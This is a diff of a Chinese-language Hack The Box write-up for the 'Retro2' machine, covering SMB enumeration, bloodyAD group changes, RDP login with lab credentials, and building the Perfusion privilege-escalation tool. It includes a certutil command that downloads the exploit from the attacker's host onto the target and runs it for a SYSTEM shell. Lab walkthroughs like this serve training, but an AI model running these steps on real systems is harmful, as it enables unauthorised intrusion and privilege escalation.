@@ -3,7 +3,10 @@
 Windows
 
 在HTB的Pwnbox,kali开启openvpn,以及win11之间来回跳，目标ip有所改变。
-
+#### Pwnbox 信息收集
+#### kali 开启bloodhoud查看目标windowns域关系图
+#### win11 使用VS生成.exe程序
+攻击命令很逻辑点单，使用的工具真复杂，花上了接近一个星期。
 ### 1.信息收集
 ![还要继续吗](images/081101.png)
 ```
@@ -17,7 +20,7 @@ $ nxc smb 10.129.86.138 -u 'guest' -p '' --shares
 ```
 ```
 $ impacket-smbclient guest@retro2.vl -no-pass
-# use Punlic
+# use Public
 # ls
 # tree
 
@@ -144,17 +147,45 @@ $ bloodyAD --host 10.129.245.212 -d retro2.vl -u 'ADMWS01$' -p 'Roguel' add grou
 ```
 $ xfreerdp /u:'ldapreader' /p:'ppYaVcB5R' /v:10.129.245.212 /d:retro2.vl /tls-seclevel:0
 ```
-#### 下载工具
+### 7.在windowns使用VS让.sln生成.exe
+https://github.com/itm4n/Perfusion
+![果然在继续](images/081501.png)
+#### 在windowns上的Visual Studio 2022,克隆https://github.com/itm4n/Perfusion.git
+#### 打开Developer Command Prompt for VS，可以执行smbuild命令生成Perfusion.exe
+![果然在继续](images/081502.png)
 ```
-$ wget https://raw.githubusercontent.com/itm4n/Perfusion/refs/heads/master/Perfusion.sln
-$ python3 -m http.server 80
+> msbuild Perfusion.sln /p:Configuration=Release /p:Platform=x64
+
+//本靶机需要的是x64
 ```
 
+![果然在继续](images/081503.png)
+![果然在继续](images/081504.png)
 ```
-PS C:\Users\ldapreader> certutil.exe -urlcache -f http://10.10.14.69/Perfusion.exe
+//虚拟机win11 | 传送
+> pyhton -m http.server 89  //在windowns不使用python3
+//Mac本机 | 接收
+% curl http://IP:89/Perfusion.exe -o Perfusion.exe
+```
+#### 从本机 -> HTB Pwnbox: https://limewire.com
+![果然在继续](images/081505.png)
+#### 继续
+#### 从HTB Pwnbox靶机 -> 靶机使用bloodyAD打开的windowns
+```
+$ ls
 Perfusion.exe
+$ python3 -m http.server 87
+
+
+PS C:\Users\ldapreader> certutil.exe -urlcache -f http://10.10.14.53:87/Perfusion.exe Perfusion.exe
 
 PS C:\Users\ldapreader> .\Perfusion.exe -c cmd -i
 ```
+![果然在继续](images/081506.png)
+#### 在执行.\Perfusion.exe -c cmd -i 之前
+##### C:\Users\administrator当前会话的权限不够，无法读取管理员用户目录的内容
+![果然在继续](images/081507.png)
+#### 在执行.\Perfusion.exe -c cmd -i 之后
+![果然在继续](images/081508.png)
 
 
